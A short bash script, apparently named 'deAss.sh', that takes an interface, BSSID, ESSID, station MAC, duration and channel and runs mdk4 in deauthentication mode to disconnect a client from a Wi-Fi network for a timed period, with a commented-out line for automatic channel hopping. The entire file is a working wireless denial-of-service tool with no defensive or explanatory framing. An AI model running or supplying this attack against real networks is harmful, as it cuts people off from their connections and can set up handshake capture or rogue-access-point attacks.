#!/bin/bash


if [ "$#" -lt 6 ]
then
    echo "[*] Usages: ./deAss.sh {Interface_name} {BSSID} {ESSID} {Station_MAC} {time} {channel}"
    exit 1
fi

if [ "$#" -eq 6 ]
then
    timeout $5m mdk4 $1 d -c $6 -S $4 -E $3 -B $2
    #To AutoMate Channel Selection
    #timeout $5m mdk4 $1 d -c h -S $4 -E $3 -B $2
fi